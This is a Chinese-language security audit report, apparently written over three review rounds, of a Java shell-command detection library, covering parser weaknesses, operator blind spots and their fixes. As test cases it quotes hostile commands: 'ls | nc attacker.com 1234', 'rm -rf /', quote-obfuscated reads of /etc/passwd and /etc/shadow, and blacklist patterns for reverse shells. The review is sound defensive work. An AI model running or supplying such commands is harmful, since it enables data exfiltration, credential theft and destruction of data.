## 2. 第一轮审查：核心设计与实现问题 (v1.0)

### 2.1 虚假的“解析”：正则分割 vs ANTLR (高危)
*   **问题描述**: 设计文档声明使用 ANTLR 处理 Bash 语法，但代码中 `ShellCommandExtractor` 仅使用 `[;|&]` 正则进行硬拆分。
*   **代码位置**: `src/main/java/com/example/shelldetector/parser/ShellCommandExtractor.java:31`
    ```java
    private static final Pattern COMMAND_DELIMITERS = Pattern.compile("[;|&]");
    ```
*   **安全影响**: 
    1.  **引号绕过**: `echo "Hello; rm -rf /"` 会被错误拆分，导致 `rm` 被拦截造成误报；反之亦可利用引号隐藏指令。
    2.  **混淆绕过**: 无法识别 `c'a't /etc/passwd`，因为简单正则无法剥离引号。
    3.  **转义字符**: 无法识别 `echo \; rm` 中的转义分号。
*   **改进要求**: 必须实现真正的 ANTLR 或状态机解析，提取 `SimpleCommand` 节点并剥离引号还原真实命令。

### 2.2 白名单匹配逻辑不完备 (中危)
*   **问题描述**: 忽略了对管道符（`|`）、后台符（`&`）等操作符本身的合法性校验。
*   **逻辑漏洞**: 如果执行 `ls | nc attacker.com 1234`，若 `ls` 在白名单而 `nc` 未被定义，管道反弹风险将被漏掉。
*   **改进要求**: 增加“允许的操作符”白名单配置，确保连接符符合安全预期。

### 2.3 规则冲突检测缺失 (中危)
*   **问题描述**: 缺乏冲突扫描逻辑。若用户同时在黑白名单定义同一正则，系统行为将变得不可预测。
*   **改进要求**: 在 `build()` 时调用 `RuleConflictChecker` 遍历并检查潜在冲突。

### 2.4 Builder 模式配置覆盖 Bug (低危)
*   **问题描述**: `withThreshold` 方法会创建一个全新的 `DetectionConfig` 对象，覆盖掉之前设置的其他属性（如 `failOnParseError`）。
*   **代码位置**: `ShellDetector.java:214`

## 3. 第二轮复审：解析加固与深层风险揭示 (v2.0)

### 3.1 阶段一修复验证
*   **状态机解析**: `ShellCommandExtractor` 已改为支持单/双引号嵌套及转义字符（`\`）的状态机逻辑。
*   **策略收紧**: `DetectionEngine` 在解析失败时由“放行”改为“风险拦截 (DANGER)”。
*   **工程化修复**: 完成了 Builder Bug 修复和冲突检测机制。

### 3.2 阶段二新风险：操作符匹配盲区 (高危)
*   **问题描述**: `ShellCommandExtractor` 在拆分指令时会丢弃管道符（`|`）、分号（`;`）等分隔符。
*   **逻辑漏洞**: `DetectionEngine` 仅对拆分后的子命令做黑名单检测。由于分隔符已消失，黑名单中定义的 `\|` 等规则将永远无法被命中。
*   **绕过场景**: 执行 `ls | nc attacker.com 1234`。即使黑名单禁止管道符，只要 `nc` 未被精确拦截，该管道反弹行为就会成功。
*   **改进建议**: 引入“原始整串黑名单匹配”。在检测子命令前，先对完整的 `entireCommand` 进行一次黑名单全量扫描。

## 4. 第三轮终审：漏洞收盘与安全加固总结 (v3.0)

### 4.1 核心漏洞彻底修复验证
1.  **操作符匹配盲区**: 已在 `DetectionEngine` 补全了对整串指令的扫描，彻底解决了管道符绕过风险。
2.  **子 Shell 递归提取**: `AntlrShellParser` 实现了对 `$()` 和反引号的递归识别与独立提取。
3.  **解析异常 Fail-Safe**: 确认所有无法解析的畸形指令均被标记为 `DANGER` 并默认拦截。

### 4.2 关键场景最终验证
| 测试场景 | 预期行为 | 实际表现 | 状态 |
| :--- | :--- | :--- | :--- |
| **高危管道绕过** (`ls | nc ...`) | 黑名单整串扫描捕获 `|` 并拦截 | **BLOCK** | 🟢 安全 |
| **嵌套子 Shell** (`echo $(rm)`) | 递归提取出 `rm` 指令并拦截 | **BLOCK** | 🟢 安全 |
| **引号混淆识别** (`c'a't /etc/shadow`) | 剥离引号识别为 `cat` 并匹配规则 | **MATCH** | 🟢 安全 |
| **规则冲突配置** | 启动时触发 Warn 提示 | **WARN** | 🟢 严谨 |

## 5. 最终建议与集成指南

*   **规则加固**: 建议在黑名单中使用 `\|\s*nc\b`、`\|\s*(ba)?sh\b` 等组合模式来防御反弹 Shell。
*   **解析策略**: 保持 `failOnParseError` 为默认开启，确保所有异常输入被安全拦截。
*   **日志审计**: 在集成时记录 `matchedRules` ID，以便在发生拦截时迅速定位拦截原因。

**最终结论**: 本类库目前具备了**“解析准确、规则优先、策略收紧、自检严谨”**的特性，完全符合防御 WebShell 及容器权限篡改的设计目标。
